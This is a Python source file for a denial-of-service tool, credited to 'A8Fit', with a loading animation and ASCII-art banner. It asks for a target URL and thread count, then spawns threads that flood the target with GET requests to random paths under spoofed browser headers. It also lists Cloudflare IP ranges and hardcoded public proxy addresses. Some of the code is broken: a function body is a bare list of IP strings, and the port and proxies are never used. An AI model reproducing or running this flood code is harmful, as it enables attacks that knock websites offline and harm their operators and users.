from nturl2path import url2pathname
import requests
import random
import string
import threading
import sys
import time
import os
import colorama
from colorama import Back, Fore, Style
from clear import clear

# Color List :
class Colors:
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"
    if not __import__("sys").stdout.isatty():
        for _ in dir():
            if isinstance(_, str) and _[0] != "_":
                locals()[_] = ""
    else:
        if __import__("platform").system() == "Windows":
            kernel32 = __import__("ctypes").windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            del kernel32

sys.stdout.write(f"\x1b]2; Loading \x07")
input(F"{Back.RESET}{Fore.GREEN}      [~] Press Enter  ")
clear()
time.sleep(0.5)
print(f'{Fore.LIGHTGREEN_EX} 30%| ██████████████████████████')
time.sleep(0.5)
print(f' 40%| ██████████████████████████████')
time.sleep(0.5)
print(f' 50%| ██████████████████████████████████')
time.sleep(0.5)
print(f' 70%| ██████████████████████████████████████')
time.sleep(0.5)
print(f' 100%| ██████████████████████████████████████████')
time.sleep(0.5)
clear()
print(f"                         ║ Update : 1.0  ║ Owner : A8Fit  ║ ")
sys.stdout.write(f"\x1b]2; ════ ║ Credit : A8Fit | Discord : c.2q | Update : 1.0 beta ║════\x07")
print(f'''{Fore.GREEN}
                ▄▄▄▄▄▄▄▄ 
          █   ▄██████████▄ 
         █▐   ████████████           :::      ::::::::  ::::::::::   :::::::   :::::::::::
         ▌▐  ██▄▀██████▀▄██        :+: :+:   :+:    :+: :+:            :+:         :+:
        ▐┼▐  ██▄▄▄▄██▄▄▄▄██       +:+   +:+  +:+    +:+ +:+            +:+         +:+
        ▐┼▐  ██████████████      +#++:++#++:  +#++:++#  :#::+::#       +#+         +#+
        ▐▄▐████─▀▐▐▀█─█─▌▐██▄    +#+     +#+ +#+    +#+ +#+            +#+         +#+
          █████──────────▐███▌   #+#     #+# #+#    #+# #+#            #+#         #+#
          █▀▀██▄█─▄───▐─▄███▀    #+#     #+# #+#    #+# #+#            #+#         #+#
          █  ███████▄██████      #+#     #+# #+#    #+# #+#            #+#         #+#
             ██████████████      ###     ###  ########  ###           #####        ###     
             █████████▐▌██▌                       @Credit : A8Fit'Alruqi     
             ▐▀▐▒▌▀█▀ ▐▒█  
                   ▐   ▌                
                    \033[4mGithub  : https://www.github.com/a8fit\033[0m''')
print(f'{Fore.LIGHTWHITE_EX}')
url = (input(f'└──URL :'))
port = (input(f'└Port :'))
a8fit = int(input(f'└Request :'))
Package = int(input(f'└Package :'))
print(f'{Fore.LIGHTWHITE_EX}')
sys.stdout.write(f"\x1b]2;::: Conntect To | URL : [{url}]  Port :[{port}] Request :[{a8fit}] :::\x07")

class DDOS:
    def __init__(self, url):
        self.target = url
        self.headers = self.get_headers()
    def get_headers(self):
        headers = {}
        headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'
        headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        headers['Accept-Language'] = 'en-US,en;q=0.5'
        headers['Accept-Encoding'] = 'gzip, deflate'
        headers['Connection'] = 'keep-alive'
        headers['Upgrade-Insecure-Requests'] = '1'
        headers['Cache-Control'] = 'max-age=0'
        return headers
    # Origin
    def origin():
        '103.21.244.0/22',
        '103.22.200.0/22',
        '103.31.4.0/22',
        '104.16.0.0/13',
        '104.24.0.0/14',
        '108.162.192.0/18',
        '131.0.72.0/22',
        '141.101.64.0/18',
        '162.158.0.0/15',
        '172.64.0.0/13',
        '173.245.48.0/20',
        '188.114.96.0/20',
        '190.93.240.0/20',
        '197.234.240.0/22',
        '198.41.128.0/17',
        '2400:cb00::/32',
        '2606:4700::/32',
        '2803:f800::/32',
        '2405:b500::/32',
        '2405:8100::/32',
        '2a06:98c0::/29',
        '2c0f:f248::/32',
    # PROXIES 
    HTTP_PROXIES = [
    'http://129.151.91.248:80',
    'http://18.169.189.181:80',
    'http://212.76.110.242:80',

    ]
    HTTPS_PROXIES = [
    'http://31.186.239.245:8080',
    'http://5.78.50.231:8888',
    'http://52.4.247.252:8129',
    ]
    proxies = {
    "http":  'http://10.10.1.10:3128',
    "https": 'https://10.10.1.10:1080',
    }
    print(f'{Fore.RED}')
    def get_random_string(self, length):
        return ''.join(random.choice(string.ascii_letters) for i in range(length))

    def start_ddos(self):
        for _ in range(Package):
            threading.Thread(target=self.send_request).start()

    def send_request(self):
        try:
            target = f'{self.target}/{self.get_random_string(a8fit)}'
            response = requests.get(target, headers=self.headers)
            if response.status_code == 200:
                print(f'{Fore.GREEN}Attack[{url}] ')
            else:
                print(f' Request to :{url} Failed Code : {response.status_code}.')
        except Exception as e:
            print(f'{Fore.LIGHTRED_EX}Error: {e}')




ddos = DDOS(url)
ddos.start_ddos()